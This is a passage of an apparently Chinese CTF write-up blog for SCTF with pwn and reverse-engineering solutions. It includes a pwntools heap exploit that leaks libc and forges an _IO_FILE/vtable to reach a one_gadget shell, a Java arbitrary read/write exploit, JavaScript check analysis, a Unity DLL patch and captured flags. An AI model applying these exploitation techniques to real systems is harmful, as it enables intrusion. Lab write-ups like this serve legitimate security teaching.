class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">file_addr=<span class="string">'./bufoverflow_b'</span></span><br><span class="line">libc_addr=<span class="string">'./libc.so.6'</span></span><br><span class="line">host=<span class="string">'116.62.152.176'</span></span><br><span class="line">port=<span class="number">20002</span></span><br><span class="line">    </span><br><span class="line">p=process(<span class="string">'./bufoverflow_b'</span>)</span><br><span class="line"><span class="keyword">if</span> len(sys.argv)==<span class="number">2</span>:</span><br><span class="line">    p=remote(host,port)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">menu</span><span class="params">(op)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'&gt;&gt;'</span>,str(op))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">alloc</span><span class="params">(size)</span>:</span></span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'Size: '</span>,str(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delsome</span><span class="params">(index)</span>:</span></span><br><span class="line">    menu(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    p.sendlineafter(<span class="string">'Index: '</span>,str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fill</span><span class="params">(con)</span>:</span></span><br><span class="line">    menu(<span class="number">3</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'Content:'</span>,con)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">()</span>:</span></span><br><span class="line"></span><br><span class="line">    menu(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new_fill</span><span class="params">(payload,size)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(size):</span><br><span class="line">        fill(<span class="string">'a'</span>*(len(payload)-i)+payload[-i])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"><span class="comment"># libc leak</span></span><br><span class="line">alloc(<span class="number">0x88</span>)<span class="comment">#0</span></span><br><span class="line">alloc(<span class="number">0x88</span>)<span class="comment">#1</span></span><br><span class="line"></span><br><span class="line">delsome(<span class="number">0</span>)</span><br><span class="line">alloc(<span class="number">0x88</span>)<span class="comment">#0</span></span><br><span class="line"></span><br><span class="line">libc=ELF(<span class="string">"./libc.so.6"</span>)</span><br><span class="line">show()</span><br><span class="line">leak=u64(p.recvline().strip().ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line"></span><br><span class="line">libc_base=leak<span class="number">-0x88</span> -libc.symbols[<span class="string">'__malloc_hook'</span>]+<span class="number">0x20</span></span><br><span class="line"></span><br><span class="line">p.info(<span class="string">'leak '</span>+hex(leak))</span><br><span class="line">p.info(<span class="string">'libc_base '</span>+hex(libc_base))</span><br><span class="line"><span class="comment"># clear</span></span><br><span class="line">delsome(<span class="number">0</span>)</span><br><span class="line">delsome(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#### overlap unsorted bin </span></span><br><span class="line">alloc(<span class="number">0x150</span>) <span class="comment">#0</span></span><br><span class="line">alloc(<span class="number">0x150</span>) <span class="comment">#1</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">'a'</span>*<span class="number">0x110</span></span><br><span class="line">payload+=p64(<span class="number">0x170</span>)+p64(<span class="number">0x31</span>)</span><br><span class="line">payload+=p64(<span class="number">0x200</span>)+p64(<span class="number">0x20</span>)</span><br><span class="line">new_fill(payload,<span class="number">0x28</span>)</span><br><span class="line"></span><br><span class="line">delsome(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x160</span>)<span class="comment">#0</span></span><br><span class="line">delsome(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x88</span>)<span class="comment">#1</span></span><br><span class="line">fill(<span class="string">'a'</span>*<span class="number">0x88</span>)</span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x88</span>)<span class="comment">#2</span></span><br><span class="line">alloc(<span class="number">0x88</span>)<span class="comment">#3</span></span><br><span class="line">alloc(<span class="number">0xb0</span>)<span class="comment">#4</span></span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x160</span>)<span class="comment">#5</span></span><br><span class="line"></span><br><span class="line">delsome(<span class="number">2</span>)</span><br><span class="line">delsome(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0xf0</span>)<span class="comment">#0</span></span><br><span class="line">delsome(<span class="number">4</span>)</span><br><span class="line">alloc(<span class="number">0x290</span>)<span class="comment">#2</span></span><br><span class="line"></span><br><span class="line">io_list=libc_base+libc.symbols[<span class="string">'_IO_list_all'</span>]</span><br><span class="line">system_addr=libc_base+libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">vtable_addr=libc_base+libc.symbols[<span class="string">'_IO_file_jumps'</span>]+<span class="number">0xc0</span><span class="number">-0x480</span></span><br><span class="line">p.info(<span class="string">'vtable_addr '</span>+hex(vtable_addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">file_struct=p64(<span class="number">0</span>)+p64(<span class="number">0x61</span>)+p64(leak)+p64(io_list - <span class="number">0x10</span>)+p64(<span class="number">2</span>)+p64(<span class="number">3</span>)</span><br><span class="line">file_struct = file_struct.ljust(<span class="number">0xd8</span>, <span class="string">"\x00"</span>)</span><br><span class="line">file_struct += p64(vtable_addr)</span><br><span class="line">file_struct += p64(libc_base + <span class="number">0x3f38a</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload=<span class="string">'z'</span>*<span class="number">0x10</span> </span><br><span class="line">payload+=file_struct</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">size=len(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ----- ugly fill ---------------</span></span><br><span class="line"><span class="comment"># one _gadget</span></span><br><span class="line">fill(<span class="string">'z'</span>*(size<span class="number">-1</span>))</span><br><span class="line">fill(<span class="string">'z'</span>*(size<span class="number">-0x8</span>)+p64(libc_base +<span class="number">0x3f38a</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># vtable </span></span><br><span class="line">fill(<span class="string">'z'</span>*(size<span class="number">-0x8</span><span class="number">-1</span>)+<span class="string">'\x00'</span>)</span><br><span class="line">fill(<span class="string">'z'</span>*(size<span class="number">-0x10</span>)+p64(vtable_addr))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0xd8</span>):</span><br><span class="line">    fill(<span class="string">'z'</span>*(size<span class="number">-0x11</span>-i)+<span class="string">'\x00'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># p64(3)</span></span><br><span class="line">fill(<span class="string">'z'</span>*(<span class="number">0x10</span>+<span class="number">0x28</span>)+<span class="string">'\x03'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x8</span>):</span><br><span class="line">    fill(<span class="string">'z'</span>*(<span class="number">0x10</span>+<span class="number">0x28</span>-i<span class="number">-1</span>)+<span class="string">'\x00'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># p64(2)</span></span><br><span class="line">fill(<span class="string">'z'</span>*(<span class="number">0x10</span>+<span class="number">0x20</span>)+<span class="string">'\x02'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x8</span>):</span><br><span class="line">    fill(<span class="string">'z'</span>*(<span class="number">0x10</span>+<span class="number">0x20</span>-i<span class="number">-1</span>)+<span class="string">'\x00'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># io_list_all -0x10 </span></span><br><span class="line">fill(<span class="string">'z'</span>*(<span class="number">0x10</span>+<span class="number">0x18</span>)+p64(io_list<span class="number">-0x10</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x8</span>):</span><br><span class="line">    fill(<span class="string">'z'</span>*(<span class="number">0x10</span>+<span class="number">0x18</span>-i<span class="number">-1</span>)+<span class="string">'\x00'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># unsorted bin addr</span></span><br><span class="line">fill(<span class="string">'z'</span>*(<span class="number">0x10</span>+<span class="number">0x10</span>)+p64(leak))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x8</span>):</span><br><span class="line">    fill(<span class="string">'z'</span>*(<span class="number">0x10</span>+<span class="number">0x10</span>-i<span class="number">-1</span>)+<span class="string">'\x00'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># size 0x61 </span></span><br><span class="line">fill(<span class="string">'z'</span>*(<span class="number">0x10</span>+<span class="number">0x8</span>)+<span class="string">'\x61'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x8</span>):</span><br><span class="line">    fill(<span class="string">'z'</span>*(<span class="number">0x10</span>+<span class="number">0x8</span>-i<span class="number">-1</span>)+<span class="string">'\x00'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># p64(0)</span></span><br><span class="line">fill(<span class="string">'z'</span>*(<span class="number">0x10</span>)+<span class="string">'\x00'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># trigger orange</span></span><br><span class="line">alloc(<span class="number">0x88</span>)</span><br><span class="line">exp_bp(<span class="string">'aaaaaaa'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><blockquote><p><code>flag:SCTF{7here_@re_s0m3_3rr0rs_7hen_wh47_wi11_u_do}</code></p></blockquote><h2><span id="wtf_game">WTF_Game</span></h2><p>看了一下java的代码，自带任意写和任意读 关键一个点就是，有了任意写和任意读，能干什么？</p><p>平时的pwn题的话随便来一波都可以get shell 但是在java环境下，这就很复杂了......</p><p>首先尝试了直接把flag给dump出来，但是弄了半天，好像怎样都dump不出来flag，放弃了</p><p>然后仔细看了下，发现Save那里会返回Player和boss在栈上的地址，然后boss的toString是可以读flag的</p><p>那样只要把player和boss交换一下，就可以拿到flag了</p><p>下面是payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">debug=<span class="number">0</span></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">p=process(<span class="string">''</span>)</span><br><span class="line"><span class="comment">#p=process('',env=&#123;'LD_PRELOAD':'./libc.so'&#125;)</span></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">gdb.attach(p)</span><br><span class="line">e=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc-2.24.so'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p=remote(<span class="string">'149.28.12.44'</span>, <span class="number">10001</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ru</span><span class="params">(x)</span>:</span></span><br><span class="line"><span class="keyword">return</span> p.recvuntil(x)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">se</span><span class="params">(x)</span>:</span></span><br><span class="line">p.sendline(x)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_addr_data</span><span class="params">(addr)</span>:</span></span><br><span class="line">se(<span class="string">'DebugSetDataStoreAddress #'</span>+str(addr))</span><br><span class="line">ru(<span class="string">'&gt;'</span>)</span><br><span class="line">se(<span class="string">'showinfo'</span>)</span><br><span class="line">data=ru(<span class="string">'\n'</span>)</span><br><span class="line">idx=data[<span class="number">1</span>:].index(<span class="string">'-'</span>)</span><br><span class="line">t=<span class="number">0x100000000</span></span><br><span class="line">d1=int(data[:idx+<span class="number">1</span>])</span><br><span class="line">d2=int(data[idx+<span class="number">2</span>:])</span><br><span class="line">d1=(d1+<span class="number">0x100000000</span>)&amp;<span class="number">0xffffffff</span></span><br><span class="line">d2=(d2+<span class="number">0x100000000</span>)&amp;<span class="number">0xffffffff</span></span><br><span class="line">ru(<span class="string">'&gt;'</span>)</span><br><span class="line"><span class="keyword">return</span> p32(d1)+p32(d2)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_data</span><span class="params">(addr,data)</span>:</span></span><br><span class="line">se(<span class="string">'DebugSetDataStoreAddress #'</span>+str(addr))</span><br><span class="line">ru(<span class="string">'&gt;'</span>)</span><br><span class="line">se(<span class="string">'SetHP #'</span>+str(data))</span><br><span class="line">ru(<span class="string">'&gt;'</span>)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">'&gt;'</span>)</span><br><span class="line">se(<span class="string">'VeroFessIsHandsome'</span>)</span><br><span class="line">ru(<span class="string">'&gt;'</span>)</span><br><span class="line">se(<span class="string">'DebugShowDataStoreAddress'</span>)</span><br><span class="line"></span><br><span class="line">addr=int(ru(<span class="string">'\n'</span>))</span><br><span class="line">ru(<span class="string">'&gt;'</span>)</span><br><span class="line">print(addr)</span><br><span class="line"></span><br><span class="line">se(<span class="string">'Save'</span>)</span><br><span class="line">data=ru(<span class="string">'\n'</span>)</span><br><span class="line">idx=data[<span class="number">1</span>:].index(<span class="string">'-'</span>)</span><br><span class="line">t=<span class="number">0x100000000</span></span><br><span class="line">d1=int(data[:idx+<span class="number">1</span>])</span><br><span class="line">d2=int(data[idx+<span class="number">2</span>:])</span><br><span class="line">d1=(d1+<span class="number">0x100000000</span>)&amp;<span class="number">0xffffffff</span></span><br><span class="line">d2=(d2+<span class="number">0x100000000</span>)&amp;<span class="number">0xffffffff</span></span><br><span class="line"></span><br><span class="line">print(hex(d1),d2)</span><br><span class="line"></span><br><span class="line">data=[]</span><br><span class="line">ru(<span class="string">'&gt;'</span>)</span><br><span class="line"></span><br><span class="line">t1=u32(get_addr_data(d1)[<span class="number">4</span>:])</span><br><span class="line">t2=u32(get_addr_data(d2)[<span class="number">4</span>:])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">write_data(d1+<span class="number">4</span>,t2<span class="number">-0x100000000</span>)</span><br><span class="line"></span><br><span class="line">se(<span class="string">'showinfo'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><blockquote><p><code>flag:sctf{UnSafe_I5_Really_UnsAfe}</code></p></blockquote><h1><span id="0x03-reverse">0x03 Reverse</span></h1><h2><span id="script-in-script">script in script</span></h2><p>动态生成了一些函数,下断点就能拿到:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">a</span>(<span class="params">r</span>) </span>&#123;</span><br><span class="line"><span class="keyword">return</span> D(~r, <span class="number">1</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">D</span>(<span class="params">r, n</span>) </span>&#123;</span><br><span class="line"><span class="keyword">return</span> n ? D(r ^ n, (r &amp; n) &lt;&lt; <span class="number">1</span>) : r</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">E</span>(<span class="params">r, n</span>) </span>&#123;</span><br><span class="line"><span class="keyword">return</span> D(r, a(n))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">F</span>(<span class="params">r, n</span>) </span>&#123;</span><br><span class="line"><span class="keyword">var</span> a = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> (n) &#123;</span><br><span class="line"><span class="keyword">if</span> (n &amp; <span class="number">1</span>) &#123;</span><br><span class="line">a = D(a, r)</span><br><span class="line">&#125;</span><br><span class="line">r = r &lt;&lt; <span class="number">1</span>;</span><br><span class="line">n = n &gt;&gt; <span class="number">1</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> a</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">G</span>(<span class="params">r, n</span>) </span>&#123;</span><br><span class="line"><span class="keyword">var</span> a = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> (r &gt;= n) &#123;</span><br><span class="line">r = E(r, n);</span><br><span class="line">a = D(a, <span class="number">1</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> a</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">H</span>(<span class="params">r</span>) </span>&#123;</span><br><span class="line"><span class="keyword">return</span> r.length</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">J</span>(<span class="params">r, n</span>) </span>&#123;</span><br><span class="line"><span class="keyword">return</span> !(r ^ n)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">K</span>(<span class="params">r, n</span>) </span>&#123;</span><br><span class="line"><span class="keyword">return</span> r[n]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">L</span>(<span class="params">r</span>) </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (r.length == <span class="number">1</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> r.charCodeAt(<span class="number">0</span>)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">M</span>(<span class="params">r</span>) </span>&#123;</span><br><span class="line"><span class="keyword">return</span> +r</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">N</span>(<span class="params">r</span>) </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">String</span>(r)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Q</span>(<span class="params">r, n, a, v</span>) </span>&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> t = r; t &lt;= n; t++) &#123;</span><br><span class="line"><span class="keyword">if</span> (a[t] != v[t - r]) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>主验证函数:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">r</span>(<span class="params">r</span>) </span>&#123;</span><br><span class="line"><span class="keyword">var</span> n = r;</span><br><span class="line"><span class="keyword">var</span> a = H(n); <span class="comment">//返回n长度</span></span><br><span class="line"><span class="keyword">var</span> v = J(a, <span class="number">24</span>); <span class="comment">//n长度为24</span></span><br><span class="line"><span class="keyword">var</span> t = K(n, <span class="number">0</span>);  <span class="comment">//s</span></span><br><span class="line"><span class="keyword">var</span> u = K(n, <span class="number">1</span>);  <span class="comment">//c</span></span><br><span class="line"><span class="keyword">var</span> i = K(n, <span class="number">2</span>);  <span class="comment">//t</span></span><br><span class="line"><span class="keyword">var</span> e = K(n, <span class="number">3</span>); <span class="comment">//取n前四位 赋值到t u i e</span></span><br><span class="line"><span class="keyword">var</span> f = D(L(t), L(i)); <span class="comment">//f为231  </span></span><br><span class="line"><span class="keyword">var</span> o = E(L(t), L(u)); <span class="comment">//o为16</span></span><br><span class="line"><span class="keyword">var</span> c = K(n, <span class="number">6</span>);</span><br><span class="line"><span class="keyword">var</span> l = K(n, <span class="number">7</span>);</span><br><span class="line"><span class="keyword">var</span> h = K(n, <span class="number">16</span>);</span><br><span class="line"><span class="keyword">var</span> w = K(n, <span class="number">17</span>); <span class="comment">//取n 7 8 17 18位 赋值到c l h w</span></span><br><span class="line"><span class="keyword">var</span> I = J(E(L(u), L(h)), <span class="number">0</span>); <span class="comment">//E(L(u), L(h)) == 0</span></span><br><span class="line"><span class="keyword">var</span> S = J(D(L(c), L(l)), D(L(h), L(w))); <span class="comment">//D(L(c), L(l)) == D(L(h), L(w))</span></span><br><span class="line"><span class="keyword">var</span> _ = J(E(L(u), L(c)), <span class="number">0</span>); <span class="comment">//E(L(u), L(c)) == 0</span></span><br><span class="line"><span class="keyword">var</span> g = K(n, <span class="number">21</span>);</span><br><span class="line"><span class="keyword">var</span> p = K(n, <span class="number">22</span>); <span class="comment">//取n 22 23 位 赋值到g p</span></span><br><span class="line"><span class="keyword">var</span> s = J(E(F(L(g), <span class="number">2</span>), <span class="number">2</span>), <span class="number">64</span>);</span><br><span class="line"><span class="keyword">var</span> P = Q(<span class="number">9</span>, <span class="number">15</span>, n, <span class="string">"Pt_In_S"</span>); <span class="comment">//9-15为Pt_In_S</span></span><br><span class="line"><span class="keyword">var</span> T = J(L(l), L(<span class="string">"r"</span>));</span><br><span class="line"><span class="keyword">var</span> b = J(f, <span class="number">231</span>);</span><br><span class="line"><span class="keyword">var</span> d = J(o, <span class="number">16</span>);</span><br><span class="line"><span class="keyword">var</span> j = M(K(n, <span class="number">5</span>));</span><br><span class="line"><span class="keyword">var</span> k = J(G(M(O(N(L(e)), <span class="string">"0"</span>)), j), <span class="number">204</span>);</span><br><span class="line"><span class="keyword">var</span> m = M(K(n, <span class="number">8</span>));</span><br><span class="line"><span class="keyword">var</span> q = Q(<span class="number">18</span>, <span class="number">20</span>, n, <span class="string">"IpT"</span>); <span class="comment">//18-20为IpT</span></span><br><span class="line"><span class="keyword">var</span> x = J(E(j, m), <span class="number">4</span>);</span><br><span class="line"><span class="keyword">var</span> y = J(F(m, m), m);</span><br><span class="line"><span class="keyword">var</span> z = J(D(L(K(n, <span class="number">4</span>)), <span class="number">2</span>), <span class="number">125</span>);</span><br><span class="line"><span class="keyword">var</span> A = J(L(u), <span class="number">99</span>); <span class="comment">//u是 ‘c’ !!!!!!!!!....</span></span><br><span class="line"><span class="keyword">var</span> B = J(L(n[<span class="number">23</span>]), <span class="number">125</span>);</span><br><span class="line"><span class="keyword">var</span> C = J(L(n[<span class="number">22</span>]), <span class="number">33</span>);</span><br><span class="line"><span class="keyword">return</span> v &amp;&amp; I &amp;&amp; S &amp;&amp; _ &amp;&amp; s &amp;&amp; P &amp;&amp; T &amp;&amp; b &amp;&amp; d &amp;&amp; k &amp;&amp; q &amp;&amp; x &amp;&amp; y &amp;&amp; z &amp;&amp; A &amp;&amp; B &amp;&amp; C</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p><code>flag:sctf{5cr1Pt_In_ScrIpT!!}</code></p></blockquote><h2><span id="where-is-my-13th-count">Where is my 13th count？</span></h2><p>反编译 <code>.\Cheat Engine_Data\Managed\Assembly-CSharp.dll</code>, 修改PlayerController.SetCountText中的判断条件, 使吃到一个的时候就移动地面, 即可看到flag.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">private void SetCountText()</span><br><span class="line">&#123;</span><br><span class="line">this.countText.text = &quot;Count: &quot; + this.count.ToString();</span><br><span class="line">if (this.count &gt;= 14) // 改为if (this.count &gt;= 1)</span><br><span class="line">&#123;</span><br><span class="line">this.winText.text = &quot;Don&apos;t Eat Your Flag!&quot;;</span><br><span class="line">this.floor.transform.position = new Vector3(this.floor.transform.position.x, this.floor.transform.position.y - 2f, this.floor.transform.position.z);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p><code>flag: SCTF{ThEFLAGGGGGGG}</code></p></blockquote><h2><span id="babymips">Babymips</span></h2><p>输入长度38, 先逐字节与下标加1异或, 然后取[5:37]先异或0x30, 再异或<code>[0x73, 0x63, 0x74, 0x66][(i-5) % 4]</code>.</p><p>解密<code>sub_400B3C</code>, 长度0x1D8, 代码解密脚本:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span 